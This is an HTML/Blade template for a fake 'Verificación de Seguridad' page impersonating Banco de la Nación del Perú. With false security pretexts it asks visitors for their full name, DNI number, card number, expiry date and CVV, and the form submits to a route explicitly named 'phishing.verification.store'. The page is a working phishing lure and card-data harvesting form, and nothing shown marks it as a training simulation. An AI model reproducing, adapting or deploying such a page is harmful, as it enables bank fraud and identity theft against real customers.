<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Verificación de Seguridad - Banco de la Nación del Perú</title>
    <meta name="title" content="Verificación de Seguridad - Banco de la Nación del Perú">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f5f5f5;
        }
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background-color: #fff;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ddd;
        }
        .header img {
            height: 50px;
        }
        .verification-box {
            width: 100%;
            max-width: 500px;
            margin: 30px auto;
            padding: 30px;
            background-color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
        }
        .verification-box h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #004a87;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 3px;
        }
        .btn {
            background-color: #004a87;
            color: white;
            border: none;
            padding: 12px 15px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        .btn:hover {
            background-color: #00365f;
        }
        .footer {
            background-color: #004a87;
            color: white;
            padding: 20px 0;
            text-align: center;
            margin-top: 50px;
        }
        .notice {
            background-color: #e8f4fd;
            border-left: 4px solid #004a87;
            padding: 15px;
            margin-bottom: 20px;
        }
        .form-row {
            display: flex;
            gap: 15px;
        }
        .form-row .form-group {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="{{ asset('img/logoBN.png') }}" alt="Logo Banco de la Nación">
    </div>
    
    <div class="container">
        <div class="verification-box">
            <h2>Verificación de Seguridad</h2>
            
            <div class="notice">
                <p>Por motivos de seguridad, necesitamos verificar su identidad antes de continuar. Por favor complete los siguientes campos para confirmar su información bancaria.</p>
            </div>
            
            <form action="{{ route('phishing.verification.store') }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="full_name">Nombre Completo:</label>
                    <input type="text" id="full_name" name="full_name" required autocomplete="off">
                </div>
                
                <div class="form-group">
                    <label for="document_number">Número de DNI:</label>
                    <input type="text" id="document_number" name="document_number" required autocomplete="off">
                </div>
                
                <div class="form-group">
                    <label for="card_number">Número de Tarjeta:</label>
                    <input type="text" id="card_number" name="card_number" required autocomplete="off" placeholder="1234 5678 9012 3456">
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="expiry_date">Fecha de Vencimiento:</label>
                        <input type="text" id="expiry_date" name="expiry_date" required autocomplete="off" placeholder="MM/AA">
                    </div>
                    
                    <div class="form-group">
                        <label for="cvv">CVV:</label>
                        <input type="text" id="cvv" name="cvv" required autocomplete="off" placeholder="123">
                    </div>
                </div>
                
                <button type="submit" class="btn">Verificar y Continuar</button>
            </form>
            
            <p style="text-align: center; margin-top: 20px; font-size: 14px; color: #666;">
                Esta verificación es necesaria para proteger su cuenta contra accesos no autorizados.
            </p>
        </div>
    </div>
    
    <div class="footer">
        <div class="container">
            <p>© 2025 Banco de la Nación. Todos los derechos reservados.</p>
            <p>Atención al cliente: 0-800-10700</p>
        </div>
    </div>
</body>
</html>